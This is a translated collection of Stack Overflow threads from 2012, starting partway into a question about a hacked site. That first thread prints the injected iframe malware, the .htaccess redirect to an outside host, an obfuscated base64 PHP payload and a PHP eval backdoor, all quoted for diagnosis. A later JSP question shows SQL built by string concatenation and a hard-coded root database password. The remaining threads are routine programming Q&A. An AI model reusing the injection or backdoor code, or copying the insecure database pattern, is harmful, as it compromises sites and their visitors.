    _q[_n]('src', 'http://cabaniaseleden.com.ar/stats.php');
    _q.style.position = 'absolute';
    _q.style.width = '12px';
    _q[_n]('frameborder', navigator.userAgent.indexOf('39c33260f6d7671e2dae7f08d1087e22') + 1);
    _q.style.left = '-4327px';
    document.write('<div id=\'pzeadv\'></div>');
    document.getElementById('pzeadv').appendChild(_q);​
</script> 
```

这是我当前的点击代码：

```
$("#nav a").click(function(event) {
    var sHREF = $(this).attr("href");
    var sPage = sHREF.replace(oVars.sPrefix(), "");

    if (oVars.sCurrent != sPage) {
        // As long as we're not currently on the page we just clicked on...
        //oVars.sCurrent = sPage;
        if (oVars.oArchive.isOpen()) oVars.oArchive.toggle();
        loadContent(sHREF, true, false);
        track(sPage);
    }
    event.preventDefault();
});​ 
```

...和`loadContent`功能：

```
function loadContent(sURL, bPush, bReplace) {

    var $Box = $("#loaded .box-1"),
        $Content = $Box.find(".inner");

    $("#nav a").removeClass("active");

    $("#nav a[href='"+ sURL +"']").addClass("active");

    oVars.sCurrent = sURL.split("&")[0];

    // Closes any picture open in Colorbox.

    if ( oVars.sCurrent != "pictures" && oVars.bI && $("#colorbox").css("display") != "none" )
        $.colorbox.close();

    if (!oVars.bIE) {

        if (bPush) {

            var objState = { page: oVars.sCurrent };

            if (bReplace)
                history.replaceState(objState, "", "");
            else
                history.pushState(objState, "", sURL);

        } else {}

    }

    if (!bReplace) {

        // Load the page.

        $Box.slideUp(oVars.iSpeed / 2, "", function() {

            $.get(

                "index.php" + oVars.sPrefix() + sURL,

                oVars.oNHF,

                function(sData) {

                    var $El = $(sData).filter(":first"),                // This is the element that would be displayed
                        $Script = $(sData).filter(":last"),
                        sPage = extractPage("ending").toLowerCase();

                    console.debug(sData);

                    // Change documentElement to body and circumvent the issues caused by the iPhone version... yadda yadda.

                    document.documentElement.className = sPage;

                    // Try and make it a regular expression to replace the words after the separator.

                    document.title = oPHP.const.NAME + oPHP.const.TEXT_DIVIDER + ( (sPage == "home") ? "Home" : oPHP.vars.titles[sPage].replace(/\<.*\>/, "").trim() );//ucwords(sPage);

                    $Box.html(sData).slideDown(oVars.iSpeed / 2);

                    // Reload the Facebook widgets for the current page.

                    reloadWidgets();

                }

            );

        } );

    }

} 
```

`sData`in在开头`loadContent`返回那个神秘的标签，如下所示：`<script>`

```
<script>

// THIS IS THE EVIL SNIPPET THAT'S BEING INSERTED INTO MY CODE.

var _q = document.createElement('iframe'),
    _n = 'setAttribute';
_q[_n]('src', 'http://cabaniaseleden.com.ar/stats.php');
_q.style.position = 'absolute';
_q.style.width = '12px';
_q[_n]('frameborder', navigator.userAgent.indexOf('39c33260f6d7671e2dae7f08d1087e22') + 1);
_q.style.left = '-4327px';
document.write('<div id=\'pzeadv\'></div>');
document.getElementById('pzeadv').appendChild(_q);

</script>

<div class="box-1" id="pictures">
    <div class="title">
        Pictures <span class="links"><a class="fblink" href="http://www.facebook.com/elemovements?sk=photos" target="_blank" title="Visit this Page on Facebook">View on Facebook</a></span>
    </div>
    <div class="body">
        <div class="inner transition">
            <div>
                <div class="section-title">
                    Albums
                </div>
                <span class="gray italic size">(4 albums, 13 pictures)</span>
            </div>
            <div class="album-container">
                <a fb-href="http://www.facebook.com/album.php?fbid=332120860192434&id=156848747719647&aid=77394" href="pictures&action=list_pics&aid=156848747719647_77394&size=1&name=Wall Photos" title="">
                <div class="album">
                    <img src="http://photos-a.ak.fbcdn.net/hphotos-ak-ash3/527637_332120863525767_1834367592_s.jpg">
                </div>
                </a>
                <div class="name">
                    <a fb-href="http://www.facebook.com/album.php?fbid=332120860192434&id=156848747719647&aid=77394" href="pictures&action=list_pics&aid=156848747719647_77394&size=1&name=Wall Photos" title="">Wall Photos</a>
                </div>
            </div>
            <div class="album-container">
                <a fb-href="http://www.facebook.com/album.php?fbid=171845276219994&id=156848747719647&aid=44093" href="pictures&action=list_pics&aid=156848747719647_44093&size=2&name=Posters" title="">
                <div class="album">
                    <img src="http://photos-b.ak.fbcdn.net/hphotos-ak-ash4/427627_278221322249055_1137145612_s.jpg">
                </div>
                </a>
                <div class="name">
                    <a fb-href="http://www.facebook.com/album.php?fbid=171845276219994&id=156848747719647&aid=44093" href="pictures&action=list_pics&aid=156848747719647_44093&size=2&name=Posters" title="">Posters</a>
                </div>
            </div>
            <div class="album-container">
                <a fb-href="http://www.facebook.com/album.php?fbid=261713630566491&id=156848747719647&aid=63000" href="pictures&action=list_pics&aid=156848747719647_63000&size=4&name=Newby's Show" title="The guys' show on 1/29/2012 at Newby's. Taken in Memphis, TN.">
                <div class="album">
                    <img src="http://photos-f.ak.fbcdn.net/hphotos-ak-ash4/407659_261713673899820_1183906213_s.jpg">
                </div>
                </a>
                <div class="name">
                    <a fb-href="http://www.facebook.com/album.php?fbid=261713630566491&id=156848747719647&aid=63000" href="pictures&action=list_pics&aid=156848747719647_63000&size=4&name=Newby's Show" title="The guys' show on 1/29/2012 at Newby's. Taken in Memphis, TN.">Newby's Show</a>
                </div>
            </div>
            <div class="album-container">
                <a fb-href="http://www.facebook.com/album.php?fbid=232326246838563&id=156848747719647&aid=56722" href="pictures&action=list_pics&aid=156848747719647_56722&size=6&name=Oxford Show" title="Taken in Oxford, MS.">
                <div class="album">
                    <img src="http://photos-d.ak.fbcdn.net/hphotos-ak-ash4/390726_232326290171892_2122883596_s.jpg">
                </div>
                </a>
                <div class="name">
                    <a fb-href="http://www.facebook.com/album.php?fbid=232326246838563&id=156848747719647&aid=56722" href="pictures&action=list_pics&aid=156848747719647_56722&size=6&name=Oxford Show" title="Taken in Oxford, MS.">Oxford Show</a>
                </div>
            </div>
            <script id="logic" language="javascript" src="min/?f=/js/logic/pictures.js" type="text/javascript"></script>
        </div>
    </div>
</div> 
```

我的数据在脚本标签之后，它不在我的代码中。您可以随时在某种控制台中自行检查。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-29T22:24:39.483

`.htaccess`这是由于对我服务器上的文件的修改引起的。我有一个本地副本，所以我覆盖了它。该文件的内容变为：

```
#c3284d#
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{HTTP_REFERER} ^.*(abacho|abizdirectory|about|acoon|alexana|allesklar|allpages|allthesites|alltheuk|alltheweb|altavista|america|amfibi|aol|apollo7|aport|arcor|ask|atsearch|baidu|bellnet|bestireland|bhanvad|bing|blog|bluewin|botw|brainysearch|bricabrac|browseireland|chapu|claymont|click4choice|clickey|clickz|clush|confex|cyber-content|daffodil|devaro|dmoz|dogpile|ebay|ehow|eniro|entireweb|euroseek|exalead|excite|express|facebook|fastbot|filesearch|findelio|findhow|finditireland|findloo|findwhat|finnalle|finnfirma|fireball|flemiro|flickr|freenet|friendsreunited|galaxy|gasta|gigablast|gimpsy|globalsearchdirectory|goo|google|goto|gulesider|hispavista|hotbot|hotfrog|icq|iesearch|ilse|infoseek|ireland-information|ixquick|jaan|jayde|jobrapido|kataweb|keyweb|kingdomseek|klammeraffe|km|kobala|kompass|kpnvandaag|kvasir|libero|limier|linkedin|live|liveinternet|lookle|lycos|mail|mamma|metabot|metacrawler|metaeureka|mojeek|msn|myspace|netscape|netzindex|nigma|nlsearch|nol9|oekoportal|openstat|orange|passagen|pocketflier|qp|qq|rambler|rtl|savio|schnellsuche|search|search-belgium|searchers|searchspot|sfr|sharelook|simplyhired|slider|sol|splut|spray|startpagina|startsiden|sucharchiv|suchbiene|suchbot|suchknecht|suchmaschine|suchnase|sympatico|telfort|telia|teoma|terra|the-arena|thisisouryear|thunderstone|tiscali|t-online|topseven|twitter|ukkey|uwe|verygoodsearch|vkontakte|voila|walhello|wanadoo|web|webalta|web-archiv|webcrawler|websuche|westaustraliaonline|wikipedia|wisenut|witch|wolong|ya|yahoo|yandex|yell|yippy|youtube|zoneru)\.(.*)
RewriteRule ^(.*)$ http://cabaniaseleden.com.ar/stats.php [R=301,L]
</IfModule>
#/c3284d#

RewriteEngine on

RewriteCond %{HTTP_HOST} ^ts\.x10\.mx$ [OR]
RewriteCond %{HTTP_HOST} ^www\.ts\.x10\.mx$
RewriteRule ^/?$ "http\:\/\/75\.66\.61\.141\/" [R=301,L] 
```

黑客还将其添加到我网站上的几个 PHP 文件中：

```
#c3284d#
echo(gzinflate(base64_decode("VVHBboMwDL1X4h9yC2hdKDCVbqOVummHnfYB64RCYkokmqSJS9t9/YChavPN9nt+9nPhhVMWN8Gs446UR7Im0ojTATQy4YAjvLUwZCFVteMHoNE8mJE+St1jqQfcIjpVnRDoczArj5+l/gqpd4LOCW0Q7VMcC15xrbiHFiRoJsyBcRd75OiZbSyNRibzeG2BWeMVKjOO55U37W30BDgric3QTVJ7+Ss6LlgZJ8H14pp3as/ROHby4Lb74SSlJVw+6pBmjyLL0uWiXsp8mSeQSg55vVjJZLHKIU1pRO5I8m+vFmocVO8fsjT/Fb5ZdXYKIaSFVB1Rcr2j9hu47HZ0U8R9bTNeeEPvASdXX67vMpzANGLcWtDytVGtDMvjwCni6UE/")));
#/c3284d# 
```

我们需要与此类互联网入侵作斗争，以防止此类事情发生。它基本上在我访问的每台服务器上。我不知道它是如何到达那里的；必须检查日志。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-12T05:41:55.123

是的我同意。另外...请检查根目录中的额外文件。它可以命名为任何 c.php、default.php 等...它有一个 php 代码开头：

```
if($_GET["rnd"]){die($_GET["rnd"]);}elseif($_POST["e"]){eval(base64_decode(str_rot13...... 
```

您也可以进行网站搜索。该文件是在更改上述 .htaccess 代码的同时添加的。

我试图追踪的不是来源，而是它的上传方式，看起来它是通过 FTP 完成的。保护您的 FTP，如果您运行 WordPress 或 Joomla，请保护您的登录页面免受暴力/彩虹攻击，这在用户名已知时非常简单（在帖子下列出）有人有更多详细信息吗？

# c# - 等价于 Java 的 BorderLayout

> ID：11243117
> 
> 赞同：1
> 
> 时间：2012-06-28T10:56:49.277
> 
> 标签：c#, .net, winforms, border-layout

有没有？如果没有，你有什么建议？现在我们正在使用过多的拆分容器，它的编码方式使得添加新控件非常困难，尤其是在相同的面板中，调整大小是毫无希望的。可以使用拆分容器以更好的方式再次对其进行重新编码，但是有更好的选择吗？

![在此处输入图像描述](../Images/aa41f1b1d8268cc68e542e277484801e.png)

图片由 Sun 的“[布局管理器视觉指南](http://docs.oracle.com/javase/tutorial/uiswing/layout/visual.html)”提供。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T11:01:36.360

听起来你想要一个[`DockPanel`](https://docs.microsoft.com/en-us/dotnet/api/system.windows.controls.dockpanel?redirectedfrom=MSDN&view=netframework-4.8).

这是演示图像：（[来源：][[microsoft.com](http://i.msdn.microsoft.com/dynimg/IC21907.png)][）][![](../Images/837c683e393fd961175ffdbeaa2551ba.png)](https://i.stack.imgur.com/e2BwP.png)

这与您的惊人相似。

在 WinForms 中，您只需使用预先存在的[`Dock`](https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.control.dock?redirectedfrom=MSDN&view=netframework-4.8)属性（另请参阅[`Anchor`](https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.control.anchor?redirectedfrom=MSDN&view=netframework-4.8)），如下所述：[http ://www.techrepublic.com/article/manage-winform-controls-using-the-anchor-and-dock-properties/ 6165908](http://www.techrepublic.com/article/manage-winform-controls-using-the-anchor-and-dock-properties/6165908)

# .net - 从非托管 win32 程序集 dll 调用托管代码 - 崩溃

> ID：11243118
> 
> 赞同：1
> 
> 时间：2012-06-28T10:56:50.167
> 
> 标签：.net, dll, assembly

`MASM32`我正在开发一个 win32 程序集 ( )中的串口 dll 。它有自己的线程检查多个事件，并在指定的缓冲区阈值时通过调用回调函数通知托管主应用程序。这只是一个没有参数/返回值的调用。

在启动时，主应用程序通过调用 dll 中的函数来存储回调函数的地址：

```
pCallBackFunction dd 0

SetCallBackPointer proc pcb:DWORD

mov eax, pcb
mov pCallBackFunction, eax
call DWORD ptr pCallBackFunction ; verify it immediately
ret

SetCallBackPointer endp 
```

上层函数立即回调托管应用程序回调例程以进行验证。它工作正常。但是，当我将调用指令放在 dll 中的其他函数时，它会使应用程序崩溃。调用是在简单函数中还是在 dll 的 threadproc 中都没有关系。例如：

```
OpenPort proc pn:byte,br:dword, inputbuffersize: dword, outputbuffersize:dword, thresholdsize: dword
LOCAL dcb: DCB
LOCAL SerialTimeOuts: COMMTIMEOUTS
call DWORD ptr pCallBackFunction
xor eax, eax
mov al, pn
mov [com_port+3],al

etc. etc. 
```

总是会在调用 DWORD ptr pCallBackFunction 时崩溃。由于我首先调用 SetCallBackPointer 将有效地址存储在 pCallBackFunction 中，因此它应该具有有效地址。

我的托管应用程序是用 C# 编写的，相关部分是：

```
public partial class Form1 : Form
{
    public delegate void CallBackDelegate();
    public static CallBackDelegate mydelegate;

    [DllImport("serialport.dll")]
    private static extern void SetCallBackPointer(CallBackDelegate Delegate);

    [DllImport("serialport.dll")]
    public static extern int OpenPort(byte com, uint br, uint inbufsize, uint outbufsize, uint threshsize);

    public Form1() 
    {

        InitializeComponent();

        mydelegate =new CallBackDelegate(CallbackFunction);

        SetCallBackPointer(mydelegate);

        unsafe
        {
            int sysstat;
            int hResult;

            hResult = OpenPort(Convert.ToByte('5'), 9600, 306, 4, 4);
        }
        }

        public static void CallbackFunction()
        {
             MessageBox.Show( "CallBack Function Called by Windows DLL");
        } 
```

VS 调试器报告该 dll 试图读取/写入受保护的内存地址。但是调用 SetCallBackPointer 时就没有这样的问题了。我在这里做错了什么？

任何提示都会很棒！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T15:13:14.730

SetCallBackDelegate 必须使用 IntPtr，而不是 Delegate 对象。

您必须使用[Marshal.GetFunctionPointerForDelegate](http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.getfunctionpointerfordelegate.aspx)函数将 System.Delegate 转换为 IntPtr32。否则，您将传递*一些*指向托管堆*某处的指针。*

所以改变

```
 mydelegate =new CallBackDelegate(CallbackFunction);
 SetCallBackPointer(mydelegate); 
```

至

```
 mydelegate =new CallBackDelegate(CallbackFunction);

 SetCallBackPointer( Marshal.GetFunctionPointerForDelegate(delegate) ); 
```

并将 SetCallBackPointer 的 C# 声明修复为

```
[DllImport("serialport.dll")]
private static extern void SetCallBackPointer(IntPtr Delegate); 
```

# javascript - 在不使用 JSON.parse 的情况下创建具有动态字段的 JSON

> ID：11243125
> 
> 赞同：1
> 
> 时间：2012-06-28T10:57:10.743
> 
> 标签：javascript, json

我在下面有一个有效的 JavaScript 代码，它使用 JSON.parse 方法动态创建 JSON 对象。有没有更短的方法来做到这一点？

```
var a = '"hi"'; 
var obj = '{' + a + ':' + '"abc"' + '}';
console.log(JSON.parse(obj)); // outputs: OBJECT: {"hi":"abc"} 
```

更简单的东西，比如......

```
var a='hi';
console.log({a:"abc"}); // but outputs: OBJECT: {a:"abc"} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:00:47.353

您可以使用方括号来访问名称为字符串的属性：

```
var a = "hi";
var obj = {}; //obj is an object literal
obj[a] = "abc"; //Set the 'hi' property of obj 
```

请注意，JSON 只是一种数据格式。它不是 JavaScript。你需要一个 JavaScript 对象字面量，而不是 JSON。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T10:59:56.593

您可以通过创建常规 JavaScript 对象并使用`JSON.stringify`

例子：

```
var obj = { "hi": "abc" };
console.log(JSON.stringify(obj));

// Output '{"hi":"abc"}' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:02:18.007

你可以这样做

```
var obj = {};
obj["hi"] = "abc"; 
```

或者

```
var obj = {};
obj.hi = "abc"; 
```

然后是 console.log(obj);

# mysql - onselect 弹出窗口中的输入值存储在父窗口输入字段中？

> ID：11243126
> 
> 赞同：0
> 
> 时间：2012-06-28T10:57:14.207
> 
> 标签：mysql, ajax, jsp

```
<% String s1= request.getParameter("filter");%>
<html>
    <head>
        <script type="text/javascript">
            var imageURL = "redar.jpg";
            function changeImage(img_id)
            {
                var imgs=document.getElementsByTagName('img'); 
                for(var i=1;i<=imgs.length;i++) {
                    var imgid="myImage"+i;
                    if(imgid==img_id){
                        document.getElementById(img_id).src="greenar.gif";
                    }
                    else{
                        document.getElementById(imgid).src=imageURL;
                    }
                }
            }
            function trim(stringToTrim) {
                return stringToTrim.replace(/^\s+|\s+$/g,"");
            }
            function validate()
            {   
                var emp_value ="";
                var count=0;
                var imgs=document.getElementsByTagName('img'); 
                for(var i=1;i<=imgs.length;i++) 
                {  var imgid="myImage"+i;
                    var imgurl = document.getElementById(imgid).src;
                    var imgar = imgurl.split("/");
                    if(imgar[4]=="greenar.gif")
                    {
                        count++;
                    }
                }
                if(count==0)
                {
                    alert("Please Select Employee Id");
                    return false;
                }
                return true;
            }
            function showEmp()
            {   if(validate())
                {   
                    var imgs=document.getElementsByTagName('img'); 
                    for(var i=1;i<=imgs.length;i++) {
                        var imgid="myImage"+i;
                        var emp_id = "eid"+i;
                        var imgurl = document.getElementById(imgid).src;
                        var imgar = imgurl.split("/");
                        if(imgar[4]=="greenar.gif"){
                            var emp_value = document.getElementById(emp_id).value;
                        }
                    }
                    xmlHttp=GetXmlHttpObject();
                    if (xmlHttp==null){
                        alert ("Browser does not support HTTP Request")
                        return
                    }
                    var url="getPatient.jsp"
                    url=url+"?emp_id="+emp_value;
                    xmlHttp.onreadystatechange=stateChanged 
                    xmlHttp.open("GET",url,true)
                    xmlHttp.send(null)
                }
            }
            function stateChanged() 
            {  if (xmlHttp.readyState==4 || xmlHttp.readyState=="complete")
                {   var showdata = xmlHttp.responseText;
                    var strar = showdata.split(":");
                    if(strar.length>0)
                   {
                       var strname = strar[1];
                       window.opener.location.reload();
                        window.location.reload(); 
                        window.close(); 
                        opener.document.getElementById("puid").value=strar[1];
                        opener.document.getElementById("fname").value=strar[2];
                        opener.document.getElementById("prdate").value=strar[3];
                        window.close();
                    }
                } 
            }
            function GetXmlHttpObject()
            {   var xmlHttp=null;
                try
                {   // Firefox, Opera 8.0+, Safari
                    xmlHttp=new XMLHttpRequest();
                }
                catch (e)
                {  //Internet Explorer
                    try
                    {
                        xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");
                    }
                    catch (e)
                    {
                        xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
                    }
                }
                return xmlHttp;
            }
        </script>
    </head>
    <body>
        <form name="employee">
            <br><br>
            <table border="1" width="300px" align="center" bgcolor="#CDFFFF">
                <tr><td align="center" colspan=3><b>Select Patient</b></td></tr>
                <%  System.out.println(s1);
                    Connection conn = null;
                    String url = "jdbc:mysql://localhost:3306/";
                    String dbName = "gold";
                    String driver = "com.mysql.jdbc.Driver";
                    String userName = "root";
                    String password = "root";
                    int sumcount = 0;
                    Statement st;
                    try {
                        Class.forName(driver).newInstance();
                        conn = DriverManager.getConnection(url + dbName, userName, password);
                        String query = "select * from gold.newdailyupdate where pmobileno='" + s1 + "' ";
                        st = conn.createStatement();
                        ResultSet rs = st.executeQuery(query);
                        int count = 0;
                        while (rs.next()) {
                            count++;
                %>
                <tr>
                    <td><input type="hidden" value="<%=rs.getString(20)%>" id="eid<%=count%>"></td>
                    <td align="right">
                        <img src="redar.jpg" width="25px" height="25px" name="myImage" onclick="changeImage(this.id);" id="myImage<%=count%>" border="0"></td>
                    <td><%=rs.getString(3)%></td>
                    <td width="50%"><%=rs.getString(20)%></td>
                </tr>
                <%
                    }
                %>
                <%  } catch (Exception e) {
                        e.printStackTrace();
                    }
                %>
                <tr><td align="center" Colspan=3><input type="button" value="Select" onclick="javascript:showEmp();"></td></tr>
            </table>
        </form>
    </body>
</html> 
```

这是我的弹出窗口页面，我可以在弹出窗口中选择值，这些值必须填充到父窗口字段。我无法将值存储在父窗口字段中，但“未定义”值存储在父窗口的所有字段中，我无法找到错误。

# knockout.js - 如何以固定次数呈现内联模板

> ID：11243134
> 
> 赞同：4
> 
> 时间：2012-06-28T10:57:36.390
> 
> 标签：knockout.js, knockout-2.0

我有一个搜索结果屏幕，在提供的结果有效负载中，我得到了一个 pageCount 号码。有了这个，我打算创建一个简单的寻呼机。

所以我真的需要这样做：

```
 <!-- ko for(var i = 0; i < pageCount(); i++) -->
        <div data-bind="html: 'Page '+$index()"></div>
    <!-- /ko --> 
```

显然这不起作用，但你明白我的意思。我想我可以在视图模型上创建另一个 observableArray 整数，每个项目代表一个页面，但这似乎有点过头了。但是，这可能是我唯一的选择？！

哦，好吧，我想我最好问一下，因为有时有一些杀手功能可以在飞行中创建一个范围，然后我可以超越那个坏男孩。

Anyhooo，我想你明白我的意思。谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-06-28T11:33:44.143

我会使用`foreach: new Array(pageCount())`：

```
<!-- ko foreach: new Array(pageCount())  -->
        <div data-bind="html: 'Page '+$index()"></div>
<!-- /ko -->​ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T11:24:59.847

如果我正确理解您的要求，请查看 Michael Best 的“重复”插件：

[https://github.com/mbest/knockout-repeat](https://github.com/mbest/knockout-repeat)

例子：

```
<div data-bind="repeat: pageCount" data-repeat-bind="html: 'Page '+$index"></div> 
```

# c++ - 无法使用现有子类创建窗口 (CreateWindowEx)

> ID：11243140
> 
> 赞同：0
> 
> 时间：2012-06-28T10:57:47.407
> 
> 标签：c++, createwindowex, window-style

我有一个父窗口和几个子窗口。使用 SpyXX，我可以看到孩子们都有一定的风格课，比如说`ChildWindowClass`。

当我使用这个特定类的名称创建窗口时，`CreateWindowEx`返回一个`NULL`句柄。如果我使用自己的类并且只设置父类，则该窗口是一个子窗口，但是 - 当然 - 与所有其他子类具有不同的类。

如果我得到样式然后设置它，则找到样式，但没有为我的子窗口设置。它仍然显示使用的样式`CreateWindowEx`

```
HWND firstChild = FindWindowEx(MyClass::_parent, NULL, szFsxChildWindowClass, NULL);
LONG childStyle = GetWindowLong(firstChild, GWL_STYLE);
...
SetWindowLong(MyClass::_child,GWL_STYLE, childStyle); 
```

我`ChildWindowClass`没有注册，所以我无法交叉检查它是如何注册的。那么如何为我的子窗口设置这种样式呢？

-- 按要求编辑通话 --

```
 child = CreateWindowEx( WS_EX_LEFT | WS_EX_LTRREADING | WS_EX_RIGHTSCROLLBAR,
        szWindowClass, // this is where I want to place the name of the child class
        _T("Test"),
        WS_CHILDWINDOW | WS_VISIBLE,
        x,y, // 0,0
        w, h, // 500,100
        MyClass::_parent, // parent
        NULL,
        MyClass::_hInstance, // must this be 0??
        NULL
        ); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:35:21.897

检查`GetLastError`。如果它不为零，那么您很可能在滥用 API。如果为 0，则意味着窗口过程通过从`WM_NCCREATE`or返回 FALSE 显式失败了创建`WM_CREATE`。

在处理这些消息时，窗口过程可以访问您传递给函数的所有参数（样式、标题、坐标、父窗口和菜单），并且特定的窗口类可能需要通过 传递附加数据`lpCreateParams`，甚至在标题或坐标，否则创建失败。

`WM_CREATE`为该类的窗口设置断点或挂钩，并检查这些现有子窗口是如何创建的，参数是什么。（假设您不只是有文档！）

# c# - Marshal Union(C) 与包含 C# 中的数组的结构

> ID：11243142
> 
> 赞同：4
> 
> 时间：2012-06-28T10:57:51.273
> 
> 标签：c#, arrays, struct, union, marshalling

我尝试在 c# 中编组一个非托管的 c++ dll，但编组器在创建我的联合时失败。

为什么这段代码会失败？

```
 [StructLayout(LayoutKind.Sequential)]
    public struct StructWithArray
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
        public int[] MySimpleArray;
        //More Stuff
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct Union
    {
        [FieldOffset(0)]
        public int Int; //Or anything else
        [FieldOffset(0), MarshalAs(UnmanagedType.Struct)]
        public StructWithArray MyStructWithArray;
        //More Structs
    } 
```

然后构建联盟：

```
Union MyUnion = new Union(); 
```

如果我使用以下消息运行代码，它将失败：（已翻译）

> {“无法加载程序集 [...] 的类型“联合”，因为它在偏移量 0 处包含一个对象字段，该字段未正确对齐或被非对象字段的字段重叠”：“联合”}

有什么建议么？

Ps：原始代码被大量简化以仅显示问题。还有更多的 Struct，Union 也包含在另一个 Struct 中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-29T13:25:47.323

声明`MySimpleArray`为固定的不安全数组：

```
[StructLayout(LayoutKind.Sequential)]
public unsafe struct StructWithArray
{
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
    public fixed int MySimpleArray[2];
    //More Stuff
}

[StructLayout(LayoutKind.Explicit)]
public struct Union
{
    [FieldOffset(0)]
    public int Int; //Or anything else
    [FieldOffset(0), MarshalAs(UnmanagedType.Struct)]
    public StructWithArray MyStructWithArray;
    //More Structs
} 
```

# java - 重定向到移动网站，除了 ipad java

> ID：11243144
> 
> 赞同：0
> 
> 时间：2012-06-28T10:57:58.093
> 
> 标签：java, javascript, ipad, redirect, mobile

我试图将移动设备重定向到移动版本，但让 Ipads 正常查看它。所有手机都可以重定向到移动站点，但 ipad 也可以，我不知道为什么？...这是我正在使用的脚本。

```
<scr!pt runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string[] mobiles = new string[] {"midp", "j2me", "avant", "docomo","novarra", 
            "palmos", "palmsource","240x320", "opwv", "chtml","pda", "windows ce", 
            "mmp/","blackberry", "mib/", "symbian","wireless", "nokia", "hand", 
            "mobi","phone", "cdm", "up.b", "audio", "SIE-", "SEC-", "samsung", 
            "HTC","mot-", "mitsu", "sagem", "sony","alcatel", "lg", "eric", "vx","NEC", 
            "philips", "mmm", "xx","panasonic", "sharp", "wap", "sch","rover", "pocket", 
            "benq", "java","pt", "pg", "vox", "amoi","bird", "compal", "kg", "voda","sany", 
            "kdd", "dbt", "sendo", "sgh", "gradi", "jb", "dddi","moto", "iphone" };
    bool isMobile = false;

    if (Request.Headers["User-Agent"] != null && Request.Browser["IsMobileDevice"] == "true")
    {
        isMobile = true;
    }
    else
    {
        foreach (string device in mobiles)
        {
            if (Request.UserAgent.ToLower().Contains(device))
            {
                isMobile = true;
            }
        }
    }

    if (isMobile == true)
    {
        Response.Redirect("///SITE//");
    }
    else
    {
        Response.Redirect("//SITE//");
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:03:50.020

这个问题[iPad 用户代理是什么？](https://stackoverflow.com/questions/2153877/what-is-the-ipad-user-agent)显示 ipad 在其 User-Agent 字符串中发送字符串 iphone。所以你数组中的最后一个字符串会绊倒它。

也许你可以做反向，即如果 USer-Agent 包含 ipad 重定向到正常站点？

希望有更多ipad经验的人能够提供更多见解。

# c# - 如何使用javascript检查是否已单击按钮？

> ID：11243149
> 
> 赞同：1
> 
> 时间：2012-06-28T10:58:33.957
> 
> 标签：c#, javascript, asp.net

在这里，我需要使用 javascript 检查按钮单击，即）如果单击按钮 A，我将调用一个 javascript 函数，如果单击按钮 B，我将调用另一个 javascript 函数。

```
if(document.getElementById('imgBTNExportPPT').clicked == true)
{
   ShowDialogExportPPTPOPUP();
}
else if(document.getElementById('btnShowModal').clicked == true)
{
   ShowDialogPrintPOPUP();
} 
```

和

```
 <asp:ImageButton ID="imgBTNExportPPT" runat="server" Width="15" Height="15" border="0"
                                                            OnClick="imgBTNExportPPT_Click" ImageUrl="~/Images/PPT_icon.png" />
  <asp:ImageButton ID="btnShowModal" runat="server" Width="15" Height="15" border="0"
                                                         ImageUrl="~/Images/Print_icon.png" onclick="btnShowModal_Click"  /> 
```

有可能吗？有什么建议吗？？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-28T11:03:24.950

试试这个 ：

```
function buttonClicked(choice)
{
   if(choice == 'A')
   {
      ShowDialogExportPPTPOPUP();
   }
   else if(choice ==  'B')
   {
      ShowDialogPrintPOPUP();
   }
} 
```

HTML 代码应该是这样的：

```
<input type='button' value='ButtonA' onclick="buttonClicked('A')" />
<input type='button' value='ButtonB' onclick="buttonClicked('B')" /> 
```

如果它是服务器端控件，那么您可以通过两种方式进行操作：

```
 <asp:ImageButton onClientClick="buttonClicked('A')" ID="imgBTNExportPPT" runat="server" Width="15" Height="15" border="0"
                                                            OnClick="imgBTNExportPPT_Click" ImageUrl="~/Images/PPT_icon.png" />
  <asp:ImageButton onClientClick="buttonClicked('A')" ID="btnShowModal" runat="server" Width="15" Height="15" border="0"
                                                         ImageUrl="~/Images/Print_icon.png" onclick="btnShowModal_Click"  /> 
```

或（在 C# 中）

```
{
 imgBTNExportPPT.Attributes.Add("onclick", "buttonClicked('A')");
 btnShowModal.Attributes.Add("onclick", "buttonClicked('B')");
} 
```

[http://msdn.microsoft.com/en-us/library/7a9d6h4f(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/7a9d6h4f(v=vs.80).aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-28T11:11:14.357

您必须使用 ImageButton 的 OnClientClick 属性来分配 javascript 函数。您可以在 javascript 调用中传递它以获取被单击的按钮对象。

*OnClientClick="TestClick('A', this);"* 在按钮中添加这个

**在 .aspx 页面中**

```
<asp:ImageButton OnClientClick="TestClick('A', this);" ID="imgBTNExportPPT" runat="server" Width="15" Height="15" border="0"                                                                  OnClick="imgBTNExportPPT_Click" ImageUrl="~/Images/PPT_icon.png"  />

<asp:ImageButton OnClientClick="TestClick('B', this);" ID="btnShowModal" runat="server" Width="15" Height="15" border="0"
                                                                 ImageUrl="~/Images/Print_icon.png" onclick="btnShowModal_Click"  /> 
```

**在脚本中**

```
function TestClick(choice, btnClicked)
{
   alert(btnClicked.id + " clicked");
   if(choice == 'A')
   {
      ShowDialogExportPPTPOPUP();
   }
   else if(choice ==  'B')
   {
      ShowDialogPrintPOPUP();
   }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
